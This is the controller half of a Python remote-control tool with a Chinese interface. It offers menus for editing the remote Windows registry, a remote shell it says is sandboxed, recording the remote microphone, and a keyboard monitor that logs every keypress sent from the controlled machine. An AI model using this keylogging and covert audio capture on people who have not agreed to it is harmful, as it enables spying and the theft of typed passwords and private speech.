        print(f"{Colors.CYAN}{Colors.BOLD}  🔐 注册表管理 (Windows){Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}  1. {Colors.RESET} 🔎 查询注册表值")
        print(f"{Colors.BOLD}  2. {Colors.RESET} ✏️ 设置注册表值")
        print(f"{Colors.BOLD}  3. {Colors.RESET} 🗑 删除注册表值/键")
        print(f"{Colors.BOLD}  0. {Colors.RESET} 🔙 返回主菜单")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

    def registry_menu(self):
        """注册表管理交互菜单"""
        while True:
            try:
                self.show_registry_menu()
                choice = input(f"\n{Colors.BOLD}请选择操作 (0-3): {Colors.RESET}").strip()

                if choice == '1':
                    self.request_registry_query()
                elif choice == '2':
                    self.request_registry_set()
                elif choice == '3':
                    self.request_registry_delete()
                elif choice == '0':
                    break
                else:
                    print(f"{Colors.RED}✗ 无效的选择, 请重新输入{Colors.RESET}")

            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}操作被用户中断{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}✗ 操作失败: {e}{Colors.RESET}")

    def request_registry_query(self):
        """请求注册表查询 (hive, key_path, 可选 name)"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  注册表查询{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

            hive = input(f"{Colors.BOLD}请输入注册表根 (HKLM/HKCU): {Colors.RESET}").strip().upper()
            key_path = input(f"{Colors.BOLD}请输入键路径 (例: SOFTWARE\\MyApp): {Colors.RESET}").strip()
            name = input(f"{Colors.BOLD}请输入值名称 (留空列出所有值): {Colors.RESET}").strip()
            if name == '':
                name = None

            msg = create_registry_query_message(hive, key_path, name)
            send_message(self.client_socket, msg)

            response = receive_message(self.client_socket)
            if response and response['type'] == MessageType.REGISTRY_RESPONSE:
                if response['data']['success']:
                    values = response['data'].get('values', {})

                    if not values:
                        print(f"{Colors.YELLOW}未找到任何值或键为空{Colors.RESET}")
                    else:
                        print(f"\n{Colors.GREEN}✓ 查询结果:{Colors.RESET}")
                        for k, v in values.items():
                            print(f"  {k}: {v}")
                else:
                    print(f"{Colors.RED}✗ 查询失败: {response['data'].get('error','未知错误')}{Colors.RESET}")

        except Exception as e:
            print(f"{Colors.RED}✗ 注册表查询失败: {e}{Colors.RESET}")

    def request_registry_set(self):
        """请求设置注册表值"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  注册表设置{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

            hive = input(f"{Colors.BOLD}请输入注册表根 (HKLM/HKCU): {Colors.RESET}").strip().upper()
            key_path = input(f"{Colors.BOLD}请输入键路径 (例: SOFTWARE\\MyApp): {Colors.RESET}").strip()
            name = input(f"{Colors.BOLD}请输入值名称: {Colors.RESET}").strip()
            value = input(f"{Colors.BOLD}请输入值 (文本): {Colors.RESET}").strip()
            vtype = input(f"{Colors.BOLD}值类型 (REG_SZ/REG_DWORD, 默认 REG_SZ): {Colors.RESET}").strip().upper()
            if not vtype:
                vtype = 'REG_SZ'

            msg = create_registry_set_message(hive, key_path, name, value, vtype)
            send_message(self.client_socket, msg)

            response = receive_message(self.client_socket)
            if response and response['type'] == MessageType.REGISTRY_RESPONSE:
                if response['data']['success']:
                    print(f"{Colors.GREEN}✓ 注册表设置成功{Colors.RESET}")
                else:
                    print(f"{Colors.RED}✗ 设置失败: {response['data'].get('error','未知错误')}{Colors.RESET}")

        except Exception as e:
            print(f"{Colors.RED}✗ 注册表设置失败: {e}{Colors.RESET}")

    def request_registry_delete(self):
        """请求删除注册表值或键"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  注册表删除{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

            hive = input(f"{Colors.BOLD}请输入注册表根 (HKLM/HKCU): {Colors.RESET}").strip().upper()
            key_path = input(f"{Colors.BOLD}请输入键路径 (例: SOFTWARE\\MyApp): {Colors.RESET}").strip()
            name = input(f"{Colors.BOLD}请输入要删除的值名称 (留空删除整个键): {Colors.RESET}").strip()
            if name == '':
                name = None

            msg = create_registry_delete_message(hive, key_path, name)
            send_message(self.client_socket, msg)

            response = receive_message(self.client_socket)
            if response and response['type'] == MessageType.REGISTRY_RESPONSE:
                if response['data']['success']:
                    print(f"{Colors.GREEN}✓ 删除成功{Colors.RESET}")
                else:
                    print(f"{Colors.RED}✗ 删除失败: {response['data'].get('error','未知错误')}{Colors.RESET}")

        except Exception as e:
            print(f"{Colors.RED}✗ 注册表删除失败: {e}{Colors.RESET}")

    def enter_shell_mode(self):
        """进入交互式Shell模式"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  交互式{SHELL_TYPE}模式 (沙箱保护){Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.RED}🔒 安全限制: Shell根目录锁定在 safe_files/ 目录内{Colors.RESET}")
            print(f"{Colors.RED}🔒 无法访问 safe_files/ 以外的任何目录{Colors.RESET}")
            print(f"{Colors.YELLOW}⚠️  命令受{SHELL_TYPE}白名单保护, 共{len(ALLOWED_COMMANDS)}个安全命令{Colors.RESET}")
            print(f"{Colors.GREEN}支持的功能: cd切换目录, 命令组合(&&, ||, |){Colors.RESET}")
            print(f"{Colors.CYAN}提示: cd / 返回根目录(safe_files), cd .. 返回上级{Colors.RESET}")
            print(f"{Colors.MAGENTA}输入 'help' 查看完整命令列表, 'exit' 退出Shell模式{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
            
            current_dir = None
            
            # Shell交互循环
            while True:
                try:
                    # 显示提示符
                    if current_dir:
                        prompt = f"{Colors.GREEN}{current_dir}{Colors.RESET} $ "
                    else:
                        prompt = f"{Colors.GREEN}remote{Colors.RESET} $ "
                    
                    command = input(prompt).strip()
                    
                    if not command:
                        continue
                    
                    # 本地help命令
                    if command.lower() == 'help':
                        self.show_shell_help()
                        continue
                    
                    # 退出Shell模式
                    if command.lower() in ['exit', 'quit']:
                        msg = create_shell_exit_message()
                        send_message(self.client_socket, msg)
                        print(f"{Colors.GREEN}✓ 已退出Shell模式{Colors.RESET}")
                        break
                    
                    # 发送Shell命令
                    msg = create_shell_message(command, current_dir)
                    send_message(self.client_socket, msg)
                    
                    # 接收响应
                    response = receive_message(self.client_socket)
                    
                    if response and response['type'] == MessageType.SHELL_RESPONSE:
                        if response['data']['success']:
                            output = response['data']['output']
                            current_dir = response['data'].get('working_dir', current_dir)
                            returncode = response['data'].get('returncode', 0)
                            
                            # 显示输出
                            if output:
                                print(output)
                            
                            # 如果返回码非0，显示警告
                            if returncode != 0:
                                print(f"{Colors.YELLOW}(返回码: {returncode}){Colors.RESET}")
                        else:
                            error = response['data'].get('error', '未知错误')
                            print(f"{Colors.RED}✗ 错误: {error}{Colors.RESET}")
                            current_dir = response['data'].get('working_dir', current_dir)
                
                except KeyboardInterrupt:
                    print(f"\n{Colors.YELLOW}使用 'exit' 命令退出Shell模式{Colors.RESET}")
                    continue
                except Exception as e:
                    print(f"{Colors.RED}✗ Shell命令执行失败: {e}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 进入Shell模式失败: {e}{Colors.RESET}")

    def request_mic_record(self):
        """请求服务器端麦克风录音并下载WAV文件"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  麦克风录音 (服务器端){Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

            dur = input(f"{Colors.BOLD}请输入录音时长(秒, 默认 5): {Colors.RESET}").strip()
            if not dur:
                duration = 5
            else:
                try:
                    duration = int(dur)
                except:
                    print(f"{Colors.RED}✗ 无效的时长, 使用默认 5 秒{Colors.RESET}")
                    duration = 5

            sampler = input(f"{Colors.BOLD}采样率 (默认 44100): {Colors.RESET}").strip()
            samplerate = int(sampler) if sampler.isdigit() else 44100

            ch = input(f"{Colors.BOLD}通道数 (1=单声道,2=立体, 默认 1): {Colors.RESET}").strip()
            channels = int(ch) if ch.isdigit() else 1

            # 只请求 WAV 格式以避免依赖外部编码器
            msg = create_mic_record_message(duration=duration, samplerate=samplerate, channels=channels)
            send_message(self.client_socket, msg)

            print(f"{Colors.CYAN}正在请求服务器录音...{Colors.RESET}")
            response = receive_message(self.client_socket)

            if response and response['type'] == MessageType.MIC_RECORD_RESPONSE:
                if response['data'].get('success'):
                    # 服务端现在只返回 WAV
                    filename = response['data'].get('filename', f'mic_{int(time.time())}.wav')
                    size = response['data'].get('size', 0)

                    print(f"{Colors.CYAN}接收音频数据 ({format_file_size(size)})...{Colors.RESET}")
                    audio_bytes = receive_binary_data(self.client_socket)
                    if audio_bytes:
                        save_path = os.path.join(DOWNLOAD_DIRECTORY, filename)
                        if write_file_binary(save_path, audio_bytes):
                            print(f"{Colors.GREEN}✓ 录音保存成功: {save_path}{Colors.RESET}")
                        else:
                            print(f"{Colors.RED}✗ 保存文件失败{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}✗ 接收音频数据失败{Colors.RESET}")
                else:
                    print(f"{Colors.RED}✗ 录音失败: {response['data'].get('error','未知错误')}{Colors.RESET}")

        except Exception as e:
            print(f"{Colors.RED}✗ 请求麦克风录音失败: {e}{Colors.RESET}")
    
    def show_shell_help(self):
        """显示Shell命令帮助"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}  {SHELL_TYPE} 命令列表{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        
        if SHELL_TYPE == 'WindowsShell':
            print(f"\n{Colors.BOLD}基础信息命令:{Colors.RESET}")
            print("  echo      - 回显文本")
            print("  dir       - 列出文件和目录")
            print("  cd        - 切换目录")
            print("  cls       - 清屏")
            print("  type      - 显示文件内容")
            print("  more      - 分页显示文件")
            print("  whoami    - 显示当前用户")
            print("  hostname  - 显示主机名")
            print("  ver       - 显示Windows版本")
            
            print(f"\n{Colors.BOLD}文件操作命令:{Colors.RESET}")
            print("  copy      - 复制文件 (仅在沙箱内)")
            print("  move      - 移动/重命名文件")
            print("  ren       - 重命名文件")
            print("  del       - 删除文件 (仅在沙箱内)")
            print("  mkdir     - 创建目录")
            print("  rmdir     - 删除目录 (仅在沙箱内)")
            
            print(f"\n{Colors.BOLD}文件查看和搜索:{Colors.RESET}")
            print("  find      - 搜索文本")
            print("  findstr   - 搜索文本 (正则)")
            print("  tree      - 显示目录树")
            print("  attrib    - 显示/修改文件属性")
            
            print(f"\n{Colors.BOLD}进程管理命令:{Colors.RESET}")
            print("  tasklist  - 显示进程列表")
            print("  taskkill  - 终止进程")
            print("    示例: taskkill /PID 1234 /F")
            print("    示例: taskkill /IM notepad.exe /F")
            print("  start     - 启动程序")
            print("  wmic      - 查询进程信息")
            print("    示例: wmic process list brief")
            
        else:  # LinuxShell
            print(f"\n{Colors.BOLD}基础信息命令:{Colors.RESET}")
            print("  echo      - 回显文本")
            print("  ls        - 列出文件和目录")
            print("  cd        - 切换目录")
            print("  clear     - 清屏")
            print("  cat       - 显示文件内容")
            print("  less      - 分页显示文件")
            print("  more      - 分页显示文件")
            print("  head      - 显示文件开头")
            print("  tail      - 显示文件结尾")
            print("  pwd       - 显示当前目录")
            print("  whoami    - 显示当前用户")
            print("  hostname  - 显示主机名")
            print("  uname     - 显示系统信息")
            
            print(f"\n{Colors.BOLD}文件操作命令:{Colors.RESET}")
            print("  cp        - 复制文件 (仅在沙箱内)")
            print("  mv        - 移动/重命名文件")
            print("  rm        - 删除文件 (仅在沙箱内)")
            print("  mkdir     - 创建目录")
            print("  rmdir     - 删除空目录")
            print("  touch     - 创建空文件/更新时间戳")
            
            print(f"\n{Colors.BOLD}文件查看和搜索:{Colors.RESET}")
            print("  grep      - 搜索文本")
            print("  find      - 查找文件")
            print("  wc        - 统计行数/字数")
            print("  tree      - 显示目录树")
            print("  stat      - 显示文件状态")
            print("  file      - 识别文件类型")
            
            print(f"\n{Colors.BOLD}文件权限:{Colors.RESET}")
            print("  chmod     - 修改权限")
            print("  chown     - 修改所有者")
            
            print(f"\n{Colors.BOLD}进程管理命令:{Colors.RESET}")
            print("  ps        - 显示进程列表")
            print("    示例: ps aux")
            print("    示例: ps -ef | grep python")
            print("  top       - 实时进程监控")
            print("  htop      - 增强版进程监控")
            print("  kill      - 终止进程")
            print("    示例: kill -9 1234")
            print("  killall   - 按名称终止进程")
            print("    示例: killall python")
            print("  pkill     - 按模式终止进程")
            print("  pgrep     - 查找进程PID")
            print("  pidof     - 查找进程PID")
            print("  pstree    - 显示进程树")
        
        print(f"\n{Colors.YELLOW}命令组合:{Colors.RESET}")
        print("  &&        - 顺序执行 (前一个成功才执行下一个)")
        print("  ||        - 或执行 (前一个失败才执行下一个)")
        print("  |         - 管道 (传递输出)")
        print("  >         - 重定向输出到文件")
        print("  >>        - 追加输出到文件")
        
        print(f"\n{Colors.RED}安全限制:{Colors.RESET}")
        print("  • 所有操作限制在 safe_files/ 目录内")
        print("  • 无法访问系统敏感目录")
        print("  • 所有命令受白名单保护")
        print(f"  • 总共允许 {len(ALLOWED_COMMANDS)} 个命令")
        
        print(f"\n{Colors.CYAN}特殊命令:{Colors.RESET}")
        print("  help      - 显示此帮助信息")
        print("  exit/quit - 退出Shell模式")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
    
    def request_system_info(self):
        """请求系统信息"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  系统信息{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            
            # 发送系统信息请求
            msg = create_system_info_message()
            send_message(self.client_socket, msg)
            
            print(f"{Colors.CYAN}正在获取系统信息...{Colors.RESET}")
            
            # 接收响应
            response = receive_message(self. client_socket)
            
            if response and response['type'] == MessageType.SYSTEM_INFO_RESPONSE:
                if response['data']['success']:
                    info = response['data']['info']
                    
                    print(f"\n{Colors.GREEN}✓ 系统信息:{Colors.RESET}\n")
                    print(f"{Colors. BOLD}{'项目':<20} {'值':<40}{Colors.RESET}")
                    print(f"{'-'*60}")
                    print(f"{'操作系统':<20} {info. get('os', 'N/A'):<40}")
                    print(f"{'系统版本':<20} {info. get('os_release', 'N/A'):<40}")
                    print(f"{'架构':<20} {info.get('architecture', 'N/A'):<40}")
                    print(f"{'处理器':<20} {info.get('processor', 'N/A'):<40}")
                    print(f"{'主机名':<20} {info.get('hostname', 'N/A'):<40}")
                    print(f"{'IP地址':<20} {info.get('ip_address', 'N/A'):<40}")
                    print(f"{'Python版本':<20} {info.get('python_version', 'N/A'):<40}")
                    print(f"{'在线状态':<20} {'在线' if info.get('online') else '离线':<40}")
                else:
                    error = response['data'].get('error', '未知错误')
                    print(f"{Colors.RED}✗ 获取系统信息失败: {error}{Colors.RESET}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 系统信息请求失败: {e}{Colors.RESET}")

    def keyboard_monitor(self):
        """键盘监控功能 - 记录被控端的按键到文件"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.CYAN}{Colors.BOLD}  🕵️ 键盘监控{Colors.RESET}")
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.YELLOW}此功能将监控被控端的所有键盘操作{Colors.RESET}")
            print(f"{Colors.YELLOW}按键记录将保存到本地文件{Colors.RESET}\n")
            
            # 生成日志文件名
            from datetime import datetime
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            log_filename = f"keyboard_log_{timestamp}.txt"
            log_filepath = os.path.join(DOWNLOAD_DIRECTORY, log_filename)
            
            print(f"日志文件: {log_filepath}")
            print(f"\n{Colors.BOLD}按 Ctrl+C 停止监控{Colors.RESET}\n")
            
            # 发送开始监控请求
            msg = create_keyboard_monitor_start_message()
            send_message(self.client_socket, msg)
            
            print(f"{Colors.GREEN}✓ 键盘监控已启动{Colors.RESET}")
            print(f"{Colors.CYAN}正在接收按键数据...{Colors.RESET}\n")
            
            # 打开日志文件
            with open(log_filepath, 'w', encoding='utf-8') as log_file:
                log_file.write(f"=== 键盘监控日志 ===\n")
                log_file.write(f"开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                log_file.write(f"目标主机: {self.server_ip}\n")
                log_file.write(f"{'='*50}\n\n")
                log_file.flush()
                
                try:
                    # 持续接收键盘事件
                    while True:
                        # 设置较短的超时以便及时响应 Ctrl+C
                        self.client_socket.settimeout(0.5)
                        
                        try:
                            response = receive_message(self.client_socket)
                            
                            if response and response['type'] == MessageType.KEYBOARD_EVENT:
                                key = response['data'].get('key', '')
                                event_type = response['data'].get('event_type', '')
                                timestamp = response['data'].get('timestamp', '')
                                
                                # 只记录按键按下事件
                                if event_type == 'press':
                                    # 格式化按键名称
                                    key_display = key.replace('Key.', '').replace("'", "")
                                    
                                    # 写入日志
                                    log_entry = f"[{timestamp}] {key_display}\n"
                                    log_file.write(log_entry)
                                    log_file.flush()
                                    
                                    # 在控制台显示
                                    print(f"{Colors.GREEN}[{timestamp[-8:]}] {key_display}{Colors.RESET}")
                        
                        except socket.timeout:
                            continue
                
                except KeyboardInterrupt:
                    print(f"\n{Colors.YELLOW}停止监控...{Colors.RESET}")
                
                finally:
                    # 恢复原始超时
                    self.client_socket.settimeout(CONNECTION_TIMEOUT)
                    
                    # 发送停止监控请求
                    msg = create_keyboard_monitor_stop_message()
                    send_message(self.client_socket, msg)
                    
                    # 写入结束时间
                    log_file.write(f"\n{'='*50}\n")
                    log_file.write(f"结束时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    log_file.write(f"=== 监控结束 ===\n")
            
            print(f"\n{Colors.GREEN}✓ 键盘监控已停止{Colors.RESET}")
            print(f"  日志已保存: {log_filepath}")
        
        except Exception as e:
            print(f"{Colors.RED}✗ 键盘监控失败: {e}{Colors.RESET}")
            import traceback
            traceback.print_exc()


def main():
    """主函数"""
    # 检查命令行参数
    if len(sys.argv) < 2:
        print(f"{Colors.RED}用法: python client.py <服务器IP>{Colors.RESET}")
        print(f"{Colors. YELLOW}示例: python client. py 127.0.0.1{Colors.RESET}")
        sys. exit(1)
    
    server_ip = sys.argv[1]
    
    # 创建并运行客户端
    client = RemoteControlClient(server_ip)
    
    try:
        client.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}程序被用户中断{Colors.RESET}")
        client.disconnect()
    except Exception as e:
        print(f"\n{Colors.RED}程序异常: {e}{Colors.RESET}")


if __name__ == '__main__':
    main()